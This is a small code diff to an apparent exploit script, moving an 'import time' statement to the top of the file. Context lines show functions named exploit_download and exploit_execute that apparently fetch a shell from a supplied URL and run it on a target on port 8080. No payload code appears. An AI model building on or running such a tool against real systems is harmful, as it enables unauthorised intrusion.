@@ -9,6 +9,7 @@ Port:   8080
 
 import argparse
 import sys
+import time
 import requests
 
 requests.packages.urllib3.disable_warnings()
@@ -140,7 +141,6 @@ def main():
             print("    and provide the URL (must be all lowercase, no redirects)")
             sys.exit(1)
         session, data = exploit_download(target, args.shell_url, args.user)
-        import time
         time.sleep(2)
         exploit_execute(target, session, data, args.user)
 
